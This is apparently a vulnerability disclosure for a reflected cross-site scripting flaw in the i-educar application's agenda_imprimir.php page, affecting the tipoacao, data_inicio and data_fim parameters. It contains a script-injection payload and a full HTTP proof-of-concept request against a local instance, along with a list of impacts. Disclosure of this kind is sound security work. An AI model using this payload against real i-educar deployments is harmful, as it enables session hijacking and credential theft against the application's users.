Cross-Site Scripting (XSS) Reflected endpoint `agenda_imprimir.php` in multiples parameters

---

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the `agenda_imprimir.php` endpoint of the _i-educar_ application. This vulnerability allows attackers to inject malicious scripts into the `tipoacao, data_inicio and data_fim` parameters. The payload is reflected in the application’s HTTP response without proper sanitization, leading to immediate execution in the victim’s browser.

---

## Details

**Vulnerable Endpoint:** `GET /agenda_imprimir.php`  
**Parameter:** `tipoacao, data_inicio and data_fim`

The application fails to properly validate and sanitize user input in the `tipoacao` parameter. An attacker can craft a malicious URL containing a JavaScript payload, which is reflected back in the server’s response and executed when a victim accesses the crafted link.

---

## PoC

**Payload:**

`"><script>alert('XSS-PoC')</script>`

### Steps to Reproduce:

1. Log in to the _i-educar_ application.
    
2. Make a request using Caido similar to the one below.

```
POST /intranet/agenda_imprimir.php?cod_agenda=2 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/intranet/agenda_imprimir.php?cod_agenda=2
Cookie: [PUT NEW COOKIE]
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

tipoacao=Novo"><script>alert('XSS-PoC')</script>&data_inicio=02%2F02%2F2025&data_fim=03%2F02%2F2025&impressora=0
```

![[Pasted image 20250816234245.png]]

The result:
![[Pasted image 20250816234414.png]]

the same vulnerability occurs in parameters `data_inicio and data_fim`.

---

## Impact

Reflected XSS vulnerabilities can lead to severe consequences, including:

- **Session hijacking:** Theft of cookies or authentication tokens
    
- **Credential theft:** Capturing sensitive user credentials via injected scripts
    
- **Malware delivery:** Redirecting victims to malicious downloads or exploit pages
    
- **Phishing attacks:** Displaying deceptive forms or content to steal user data
    
- **Reputation damage:** Exploiting trust between the application and its users
    
- **Client-side manipulation:** Altering the application’s content and behavior dynamically


## Discoverer

[Marcelo Queiroz](www.linkedin.com/in/marceloqueirozjr)

by [CVE-Hunters](https://github.com/Sec-Dojo-Cyber-House/cve-hunters)